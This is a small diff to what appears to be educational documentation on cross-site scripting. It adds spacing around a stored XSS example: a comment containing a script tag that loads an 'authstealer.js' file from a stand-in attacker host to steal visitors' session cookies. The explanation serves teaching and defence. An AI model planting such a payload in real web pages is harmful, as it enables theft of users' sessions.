@@ -101,7 +101,9 @@ Example of Cross-Site Scripting:
 	
 * Stored XSS Example: An attacker figures out that the comment section of a website can store 
   HTML tags. They leave a comment that says: 
+  
   "Great price for a great item! Read my review here <script src="http://hackersite.com/authstealer.js"> </script>" [xss-attacks]_
+  
   This is a stored in the website, and every time someone visits the page, they have their 
   session cookies stolen
 
